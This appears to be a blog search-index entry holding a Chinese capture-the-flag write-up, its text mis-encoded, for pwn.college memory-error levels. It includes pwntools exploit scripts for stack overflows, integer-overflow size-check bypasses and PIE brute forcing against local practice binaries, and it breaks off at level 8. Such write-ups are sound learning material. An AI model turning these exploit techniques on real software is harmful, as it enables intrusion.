<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn college åˆ·é¢˜è®°å½•ï¼š memory-errors</title>
    <link href="/p/3bd14ce9/"/>
    <url>/p/3bd14ce9/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ“’"><a href="#ğŸ“’" class="headerlink" title="ğŸ“’"></a>ğŸ“’</h1><p>å†™åœ¨å‰é¢</p><ul><li>4ã€5 æ¶‰åŠåˆ©ç”¨æ•´æ•°æº¢å‡ºæ¼æ´ç»•è¿‡æ£€æµ‹</li><li>7 å¼€å§‹å¼€å¯äº† pieï¼Œå¹¶ä¸”åªèƒ½æº¢å‡ºè¿”å›åœ°å€çš„æœ€åä¸¤ä¸ªå­—èŠ‚ï¼Œéœ€è¦ç”¨åˆ°ä¸€äº›é¡µæœºåˆ¶</li><li>8 ä½¿ç”¨ memcpy å°†å †ä¸Š buf çš„å†…å®¹å¤åˆ¶åˆ°æ ˆä¸Šé¢</li><li>9 Canary + pie + ç¥å¥‡ read 1bytes é€»è¾‘</li><li>10 å¯ç”¨äº† pie å’Œ Canaryï¼Œç®€å•æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>11 æ¶‰åŠ mmap å‡½æ•°çš„å†…å­˜åˆ†é…ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡ºæ¼æ´</li><li>12 pie+Canary+åé—¨äºŒæ¬¡è°ƒç”¨ï¼Œ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²å‡º Canary ç„¶åçˆ†ç ´å¯¹æŠ— pie</li><li>14 å¾ˆæœ‰æ„æ€çš„ä¸€é¢˜ï¼Œåƒæ˜¯ 12+13 çš„ç»“åˆã€‚åˆ©ç”¨æœªåˆå§‹åŒ–çš„ç¼“å†²åŒº leak Canaryï¼Œè°ƒè¯•è·å¾—æ ˆä¸ŠCanary çš„åç§»</li><li>15 ç½‘ç»œç¨‹åº fork å‡½æ•°è°ƒç”¨ + Canary æ³„éœ² + pie + ret 3 nibbleã€‚è¿™é‡Œé‡ç‚¹æ˜¯ä½¿ç”¨å¤šè¿›ç¨‹çˆ†ç ´ Canary çš„è¿‡ç¨‹ï¼Œé€»è¾‘è¾ƒå¤æ‚<h1 id="1-0"><a href="#1-0" class="headerlink" title="1-0"></a>1-0</h1></li></ul><p>ç›´æ¥è¦†ç›–è¿”å›åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level1.0&#x27;</span>)<br><br><span class="hljs-comment"># p.recvall()</span><br><br>p.send(<span class="hljs-string">b&#x27;200&#x27;</span>)<br><br><span class="hljs-comment"># p.recvall()</span><br><br><span class="hljs-comment"># å¡«å……éƒ¨åˆ†</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">70</span><br><br><span class="hljs-comment"># åŸºæŒ‡é’ˆå¡«å……éƒ¨åˆ†</span><br>base_pointer_padding = <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span><br><br><span class="hljs-comment"># è¿”å›åœ°å€ 0x000000000000152C</span><br>return_address = p64(<span class="hljs-number">0x152C</span>)<br><br><span class="hljs-comment"># æ„é€ è¾“å…¥</span><br>payload = padding + base_pointer_padding + return_address<br><br><span class="hljs-comment"># å‘é€ payload</span><br>p.send(payload)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶æ‰“å°æ‰€æœ‰æ•°æ®</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure><h1 id="1-1"><a href="#1-1" class="headerlink" title="1-1"></a>1-1</h1><p>åŒä¸Š</p><h1 id="2-0"><a href="#2-0" class="headerlink" title="2-0"></a>2-0</h1><p>æœ‰ Canaryï¼Œå°†å¯¹åº” win variable åœ°å€å†…å®¹ä¿®æ”¹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level2.0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br><span class="hljs-comment"># å¡«å……éƒ¨åˆ†</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">104</span><br><br><span class="hljs-comment"># è®¾ç½®ä¸º win çš„å€¼</span><br>win_value = p32(<span class="hljs-number">0x1c62f8f8</span>)<br><br><span class="hljs-comment"># æ„é€ è¾“å…¥</span><br>payload = padding + win_value<br><br><span class="hljs-comment"># å‘é€ payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶æ‰“å°æ‰€æœ‰æ•°æ®</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure><h1 id="2-1"><a href="#2-1" class="headerlink" title="2-1"></a>2-1</h1><p>In this level, there is a â€œwinâ€ variable.<br>By default, the value of this variable is zero.<br>However, if you can set variable to 0x1c62f8f8, the flag will be printed.</p><p>â€¢ ç¼“å†²åŒº v6 å¤§å°ä¸º 120 å­—èŠ‚ï¼Œä½äº rsp+40hã€‚<br>â€¢ v5 æŒ‡å‘ v6 çš„ç¬¬ 116 å­—èŠ‚ (<code>&amp;v6[116]</code>)ã€‚<br>â€¢ æˆ‘ä»¬éœ€è¦å†™å…¥ 120 å­—èŠ‚æ¥å¡«æ»¡ç¼“å†²åŒºï¼Œç„¶åè¦†ç›– v5 æŒ‡å‘çš„å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level2.1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br><span class="hljs-comment"># å¡«å……éƒ¨åˆ†</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">116</span><br><br><span class="hljs-comment"># è®¾ç½®ä¸º win çš„å€¼</span><br>win_value = p32(<span class="hljs-number">0x47ba9894</span>)<br><br><span class="hljs-comment"># æ„é€ è¾“å…¥</span><br>payload = padding + win_value<br><br><span class="hljs-comment"># å‘é€ payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶æ‰“å°æ‰€æœ‰æ•°æ®</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure><h1 id="3-0"><a href="#3-0" class="headerlink" title="3-0"></a>3-0</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__int64 v9[<span class="hljs-number">13</span>]<span class="hljs-comment">; // [rsp+30h] [rbp-80h] BYREF</span><br><br><span class="hljs-attribute">buf</span> = v9<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>è¦†ç›–</p><ul><li>ç¼“å†²åŒº<code>8*16</code></li><li>å‰ ebp</li><li>è¿”å›åœ°å€</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># Set architecture</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># Create a process object running the binary</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level3.0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br><span class="hljs-comment"># Buffer layout</span><br>buffer_size = <span class="hljs-number">8</span>*<span class="hljs-number">16</span><br>additional_padding = <span class="hljs-number">8</span><br>win_function_address = p64(<span class="hljs-number">0x401833</span>)  <br><br><span class="hljs-comment"># Constructing the payload</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br>payload += <span class="hljs-string">b&#x27;B&#x27;</span> * additional_padding<br>payload += win_function_address<br><br><span class="hljs-comment"># Send the payload</span><br>p.send(payload)<br><br><span class="hljs-comment"># Receive and print all data</span><br><span class="hljs-built_in">print</span>(p.recvall().decode())<br><br></code></pre></td></tr></table></figure><h1 id="3-1"><a href="#3-1" class="headerlink" title="3-1"></a>3-1</h1><p>ç•¥</p><h1 id="4-0"><a href="#4-0" class="headerlink" title="4-0"></a>4-0</h1><p>æ•´æ•°æº¢å‡ºã€‚è¾“å…¥ -1 å¯ä»¥ç»•è¿‡å¤§å°æ£€æµ‹ï¼Œè¡¥ç åŸç†å¯¼è‡´ read ä¸€ä¸ªå¤§çš„ç¼“å†²åŒºé•¿åº¦</p><p><code>read()</code>Â å‡½æ•°çš„åŸå‹å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbyte)</span></span>;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­:</p><ul><li><code>fd</code>Â æ˜¯æ–‡ä»¶æè¿°ç¬¦,è¡¨ç¤ºè¦è¯»å–æ•°æ®çš„æ–‡ä»¶æˆ–è®¾å¤‡ã€‚</li><li><code>buf</code>Â æ˜¯ä¸€ä¸ªæŒ‡é’ˆ,æŒ‡å‘å­˜å‚¨è¯»å–æ•°æ®çš„ç¼“å†²åŒºã€‚</li><li><code>nbyte</code>Â æ˜¯è¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚<strong>æ³¨æ„å®ƒæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°</strong></li></ul><p>ç»•è¿‡</p><ul><li><code>if (SLODWORD(nbytes[0]) &gt; 44)</code><ul><li>å› ä¸º <code>nbytes[0]</code> æ˜¯ä¸€ä¸ªæœ‰ç¬¦å·æ•´æ•°ï¼Œæ‰€ä»¥å½“å…¶å€¼ä¸º -1 æ—¶ï¼ˆ-1 æ˜¾ç„¶å°äº 44ï¼‰ï¼Œä¸ä¼šè§¦å‘ exit(1) é€€å‡ºç¨‹åº</li></ul></li><li><code>v9 = read(0, buf, LODWORD(nbytes[0]));</code> åœ¨ read() çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œ size_t å‚æ•°ä¸ºæ— ç¬¦å·æ•´æ•°ï¼ˆunsigned intï¼‰ï¼Œ-1 è½¬æ¢ä¸ºæ— ç¬¦å·æ•´æ•°åå˜æˆäº† 0xFFFFFFFFï¼Œå¯¼è‡´ read() å‡½æ•°å°è¯•ä»æ ‡å‡†è¾“å…¥è¯»å–é«˜è¾¾0xFFFFFFFFæ•°æ®åˆ° buf ä¸­ï¼Œä»è€Œè§¦å‘ç¼“å†²åŒºæº¢å‡º</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level4.0&#x27;</span>)<br><br><span class="hljs-comment"># å‡†å¤‡æœ‰æ•ˆè½½è·</span><br>buffer_size = <span class="hljs-number">64</span><br>padding_to_ret_address = <span class="hljs-number">8</span>  <br>win_func_address = p64(<span class="hljs-number">0x40209A</span>)  <span class="hljs-comment"># æ›¿æ¢ä¸ºå®é™…åœ°å€</span><br><br><span class="hljs-comment"># å‘é€æ•´æ•°ä¸‹æº¢å€¼ç»•è¿‡å¤§å°æ£€æŸ¥</span><br>p.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>, <span class="hljs-string">&quot;-1&quot;</span>)<br><br><span class="hljs-comment"># æ„é€ æº¢å‡ºå¹¶è¦†ç›–è¿”å›åœ°å€çš„æœ‰æ•ˆè½½è·</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br>payload += <span class="hljs-string">b&#x27;B&#x27;</span> * padding_to_ret_address<br>payload += win_func_address<br><br> <br>p.sendline(payload)<br><br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="4-1"><a href="#4-1" class="headerlink" title="4-1"></a>4-1</h1><p>ç•¥</p><h1 id="5-0"><a href="#5-0" class="headerlink" title="5-0"></a>5-0</h1><p>é˜²èŒƒé€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number of payload records to send: &quot;</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v9);<br>  <span class="hljs-keyword">if</span> ( !v9 )<br>    __assert_fail(<span class="hljs-string">&quot;record_num &gt; 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x8B</span>u, <span class="hljs-string">&quot;challenge&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of each payload record: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v8);<br>  <span class="hljs-keyword">if</span> ( !v8 )<br>    __assert_fail(<span class="hljs-string">&quot;record_size &gt; 0&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x8E</span>u, <span class="hljs-string">&quot;challenge&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v8 * v9 &gt; <span class="hljs-number">7</span> )<br>    __assert_fail(<span class="hljs-string">&quot;record_size * record_num &lt; (unsigned int) sizeof(input)&quot;</span>, <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-number">0x8F</span>u, <span class="hljs-string">&quot;challenge&quot;</span>);<br>  nbytes = v8 * (<span class="hljs-keyword">unsigned</span> __int64)v9;<br>  v11 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <br></code></pre></td></tr></table></figure><p>å¯¹äº32 ä½æ— ç¬¦å·æ•´æ•°ï¼Œ429496730 * 10 = 4294967300ã€‚åœ¨ 32 ä½ä¸­ï¼Œè¿™ä¸ªç»“æœå°†ä¼šæº¢å‡ºï¼Œå®é™…ç»“æœå°†æ˜¯ 4294967300 mod 2^32 = 4ï¼Œè¿™æ»¡è¶³ v8 * v9 &lt;= 7ï¼Œä»è€Œé€šè¿‡æ•´æ•°æº¢å‡ºæ¼æ´ç»•è¿‡æ£€æŸ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level5.0&#x27;</span>)<br><br>buffer_size = <span class="hljs-number">96</span><br>padding_to_ret_address = <span class="hljs-number">8</span>  <br>win_func_address = p64(<span class="hljs-number">0x401637</span>)  <span class="hljs-comment"># æ›¿æ¢ä¸ºå®é™…åœ°å€</span><br><br><span class="hljs-comment"># Send negative values correctly interpreted by your payload logic</span><br>p.sendlineafter(<span class="hljs-string">&quot;Number of payload records to send: &quot;</span>, <span class="hljs-string">&quot;429496730&quot;</span>) <br>p.sendlineafter(<span class="hljs-string">&quot;Size of each payload record: &quot;</span>, <span class="hljs-string">&quot;10&quot;</span>)<br><br><span class="hljs-comment"># æ„é€ æº¢å‡ºå¹¶è¦†ç›–è¿”å›åœ°å€çš„æœ‰æ•ˆè½½è·</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br>payload += <span class="hljs-string">b&#x27;B&#x27;</span> * padding_to_ret_address<br>payload += win_func_address<br><br> <br>p.sendline(payload)<br><br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="5-1"><a href="#5-1" class="headerlink" title="5-1"></a>5-1</h1><p>ç•¥</p><h1 id="6-0"><a href="#6-0" class="headerlink" title="6-0"></a>6-0</h1><p>ç›´æ¥è·³è½¬åˆ°<code>if ( a1 == 4919 )</code>çš„ä¸‹ä¸€æ¡è¯­å¥å³å¯</p><h1 id="6-1"><a href="#6-1" class="headerlink" title="6-1"></a>6-1</h1><p>ç•¥</p><h1 id="7-0"><a href="#7-0" class="headerlink" title="7-0"></a>7-0</h1><p>å¼€å¯äº† pieï¼Œå¹¶ä¸”åªèƒ½æº¢å‡ºè¿”å›åœ°å€çš„æœ€åä¸¤ä¸ªå­—èŠ‚</p><p>ä»¥A BCDä¸ºä¾‹ï¼ŒA æ˜¯é¡µè¡¨åŸºåœ°å€ï¼›BCD æ˜¯æœ€åçš„ 12 ä½ï¼Œæ˜¯é¡µè¡¨å†…åç§»ï¼Œè¿™ä¸ªæ˜¯ä¸å˜çš„ã€‚ç”¨ ida æˆ–è€… gdb p &amp;funcæŸ¥çœ‹challenge å’Œ winä¸¤ä¸ªå‡½æ•°ï¼Œå‘ç°éå¸¸ç›¸è¿‘ï¼Œæœ‰ç†ç”±è®¤ä¸ºåœ¨ä¸€ä¸ªé¡µå†…ï¼Œå› æ­¤è¿™ä¸¤ä¸ªå‡½æ•°çš„åœ°å€åªæœ‰å€’æ•°ç¬¬å››ä¸ª 16 è¿›åˆ¶æ•°å­—æ˜¯ä¸åŒçš„</p><p>çˆ†ç ´å³å¯ï¼Œ16 ç§æƒ…å†µï¼Œå¹³å‡ç¬¬å…«æ¬¡å³å¯å¾—å‡ºç­”æ¡ˆ</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åœ¨x86-64æ¶æ„ä¸­ï¼Œå…¸å‹çš„é¡µè¡¨è§£æå¦‚ä¸‹ï¼š<br><br><span class="hljs-bullet">1.</span> <span class="hljs-strong">**é¡µå†…åç§»ï¼ˆæœ€å12ä½ï¼‰ï¼š**</span>Â ç”¨äºåœ¨4KBé¡µé¢å†…çš„åç§»ã€‚ 0x1000<br><span class="hljs-bullet">2.</span> <span class="hljs-strong">**é¡µè¡¨é¡¹ç´¢å¼•ï¼ˆPage Table Entry, PTEï¼‰ï¼š**</span>Â ç”¨äºä¸‰çº§é¡µè¡¨ä¸­çš„ç´¢å¼•ï¼ˆ9ä½ï¼‰ã€‚<br><span class="hljs-bullet">3.</span> <span class="hljs-strong">**é¡µç›®å½•é¡¹ç´¢å¼•ï¼ˆPage Directory Entry, PDEï¼‰ï¼š**</span>Â ç”¨äºäºŒçº§é¡µè¡¨ä¸­çš„ç´¢å¼•ï¼ˆ9ä½ï¼‰ã€‚<br><span class="hljs-bullet">4.</span> <span class="hljs-strong">**é¡µç›®å½•æŒ‡é’ˆè¡¨ç´¢å¼•ï¼ˆPage Directory Pointer Table, PDPTï¼‰ï¼š**</span>Â ç”¨äºä¸€çº§é¡µè¡¨ä¸­çš„ç´¢å¼•ï¼ˆ9ä½ï¼‰ã€‚<br><span class="hljs-bullet">5.</span> <span class="hljs-strong">**é¡µæ˜ å°„å±‚ç´¢å¼•ï¼ˆPage Map Level 4, PML4ï¼‰ï¼š**</span>Â ç”¨äºé¡¶çº§é¡µè¡¨ä¸­çš„ç´¢å¼•ï¼ˆ9ä½ï¼‰ã€‚<br><br><span class="hljs-section">### å…·ä½“ç¤ºä¾‹è§£æ</span><br><br>ä»¥Â <span class="hljs-code">`0x561dfac99059`</span>Â ä¸ºä¾‹ï¼š<br><br><span class="hljs-bullet">1.</span> <span class="hljs-strong">**æœ€å12ä½ï¼ˆé¡µå†…åç§»ï¼‰ï¼š**</span>Â <span class="hljs-code">`0x059`</span>ã€‚<br><span class="hljs-bullet">2.</span> <span class="hljs-strong">**é¡µè¡¨é¡¹ç´¢å¼•ï¼ˆPTEï¼‰ï¼š**</span>Â <span class="hljs-code">`0x9`</span>ï¼Œå³äºŒè¿›åˆ¶Â <span class="hljs-code">`1001`</span>ã€‚<br><span class="hljs-bullet">3.</span> <span class="hljs-strong">**é¡µç›®å½•é¡¹ç´¢å¼•ï¼ˆPDEï¼‰ï¼š**</span>Â <span class="hljs-code">`0xC`</span>ï¼Œå³äºŒè¿›åˆ¶Â <span class="hljs-code">`1100`</span>ã€‚<br><span class="hljs-bullet">4.</span> <span class="hljs-strong">**é¡µç›®å½•æŒ‡é’ˆè¡¨ç´¢å¼•ï¼ˆPDPTï¼‰ï¼š**</span>Â <span class="hljs-code">`0xA`</span>ï¼Œå³äºŒè¿›åˆ¶Â <span class="hljs-code">`1010`</span>ã€‚<br><span class="hljs-bullet">5.</span> <span class="hljs-strong">**é¡µæ˜ å°„å±‚ç´¢å¼•ï¼ˆPML4ï¼‰ï¼š**</span>Â <span class="hljs-code">`0x561df`</span>ï¼Œè¿™æ˜¯ä¸€ä¸ªè¾ƒå¤§çš„å€¼ï¼Œéœ€è¦è¿›ä¸€æ­¥æ‹†åˆ†ï¼ˆå‡è®¾é«˜ä½éƒ¨åˆ†æ˜¯Â <span class="hljs-code">`0x561d`</span>ï¼Œåç»­éƒ¨åˆ†Â <span class="hljs-code">`f`</span>Â ä½œä¸ºä½ä½ï¼‰ã€‚<br></code></pre></td></tr></table></figure><p>æ€è·¯</p><ul><li>è¦†ç›–æœ€åä¸‰ä¸ªåå…­è¿›åˆ¶æ•°</li><li>çˆ†ç ´å€’æ•°ç¬¬å››ä¸ªåå…­è¿›åˆ¶æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>: <span class="hljs-comment"># brute forcing</span><br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level7.1&#x27;</span>)<br>    <br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)  <span class="hljs-comment"># ç­‰å¾…ç›´åˆ°æ¥æ”¶åˆ°ç‰¹å®šå­—ç¬¦ä¸²</span><br>    p.sendline(<span class="hljs-string">&#x27;74&#x27;</span>)             <span class="hljs-comment"># å‘é€å­—ç¬¦ä¸²&#x27;122&#x27;ï¼Œè¡¨ç¤ºæ¥ä¸‹æ¥çš„è´Ÿè½½å¤§å°</span><br><br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">72</span> + p64(<span class="hljs-number">0x1E63</span>)<br>    <span class="hljs-comment">#p.recvline(&#x27;Send your payload&#x27;)</span><br>    p.sendline(payload)<br><br>    <span class="hljs-comment">#p.interactive()</span><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h1 id="7-1"><a href="#7-1" class="headerlink" title="7-1"></a>7-1</h1><p>ç•¥</p><h1 id="8-0"><a href="#8-0" class="headerlink" title="8-0"></a>8-0</h1><p>é¢˜ç›®å…ˆè¯»å–å­—èŠ‚æ•°ï¼Œç„¶åå°†è¿™ä¹ˆå¤šå­—èŠ‚è¯»å–åˆ°bufï¼Œä¹Ÿå°±æ˜¯å †ä¸Šé¢</p><p>ç„¶åä½¿ç”¨ memcpy å°†å †ä¸Š buf 